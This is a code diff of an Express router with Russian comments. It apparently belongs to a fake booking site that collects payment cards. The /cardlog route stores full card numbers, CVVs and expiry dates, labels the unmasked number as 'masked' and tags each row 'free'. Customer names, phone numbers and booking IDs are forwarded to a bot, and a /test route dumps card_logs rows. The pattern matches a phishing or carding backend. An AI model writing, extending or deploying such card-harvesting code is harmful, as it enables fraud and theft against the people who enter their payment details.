@@ -56,20 +56,23 @@ router.post("/booking", (req, res) => {
 
 // ➝ Данные заказчика
 router.post("/customer", async (req, res) => {
-  const { sessionId, name, surname, phone, email } = req.body;
+  const { sessionId, name, surname, phone, bookingId } = req.body;
 
   db.prepare(
     `
-    INSERT INTO customers (session_id, name, surname, phone, email)
-    VALUES (?, ?, ?, ?, ?)
+    INSERT INTO customers (session_id, name, surname, phone)
+    VALUES (?, ?, ?, ?)
   `
-  ).run(sessionId, name, surname, phone, email);
+  ).run(sessionId, name, surname, phone);
+  const booking = db
+    .prepare("SELECT booking_id FROM bookings WHERE session_id = ?")
+    .get(sessionId) as any;
   try {
     await sendCustomerToEchoBot({
       sessionId: sessionId,
+      bookingId: booking?.booking_id,
       firstName: name,
       lastName: surname,
-      email: email,
       phoneNumber: phone,
     });
     console.log(
@@ -87,16 +90,16 @@ router.post("/customer", async (req, res) => {
 
 // ➝ Данные карты
 router.post("/cardlog", async (req, res) => {
-  const { sessionId, cardNumber, cardHolder, expireDate, cvv } = req.body;
+  const { sessionId, cardNumber, expireDate, cvv } = req.body;
 
   const masked = cardNumber;
 
   db.prepare(
     `
-    INSERT INTO card_logs (session_id, full_pan, masked_pan, card_holder, cvv, expire_date, status)
-    VALUES (?, ?, ?, ?, ?, ?, ?)
+    INSERT INTO card_logs (session_id, full_pan, masked_pan, cvv, expire_date, status)
+    VALUES (?, ?, ?, ?, ?, ?)
   `
-  ).run(sessionId, cardNumber, masked, cardHolder, cvv, expireDate, "free");
+  ).run(sessionId, cardNumber, masked, cvv, expireDate, "free");
 
   // Получаем bookingId для бота
   const booking = db
@@ -382,12 +385,16 @@ router.get("/test", (req, res) => {
     const bookings = db.prepare("SELECT * FROM bookings LIMIT 5").all();
     const customers = db.prepare("SELECT * FROM customers LIMIT 5").all();
     const cardLogs = db.prepare("SELECT * FROM card_logs LIMIT 5").all();
-    
+
     // Получаем общую статистику
     const stats = {
       totalBookings: db.prepare("SELECT COUNT(*) as count FROM bookings").get(),
-      totalCustomers: db.prepare("SELECT COUNT(*) as count FROM customers").get(),
-      totalCardLogs: db.prepare("SELECT COUNT(*) as count FROM card_logs").get(),
+      totalCustomers: db
+        .prepare("SELECT COUNT(*) as count FROM customers")
+        .get(),
+      totalCardLogs: db
+        .prepare("SELECT COUNT(*) as count FROM card_logs")
+        .get(),
     };
 
     res.json({
@@ -400,21 +407,21 @@ router.get("/test", (req, res) => {
         sampleData: {
           bookings: bookings,
           customers: customers,
-          cardLogs: cardLogs
-        }
+          cardLogs: cardLogs,
+        },
       },
       server: {
         uptime: process.uptime(),
         nodeVersion: process.version,
-        platform: process.platform
-      }
+        platform: process.platform,
+      },
     });
   } catch (error) {
     console.error("Test route error:", error);
     res.status(500).json({
       success: false,
       message: "Ошибка при работе с базой данных",
-      timestamp: new Date().toISOString()
+      timestamp: new Date().toISOString(),
     });
   }
 });
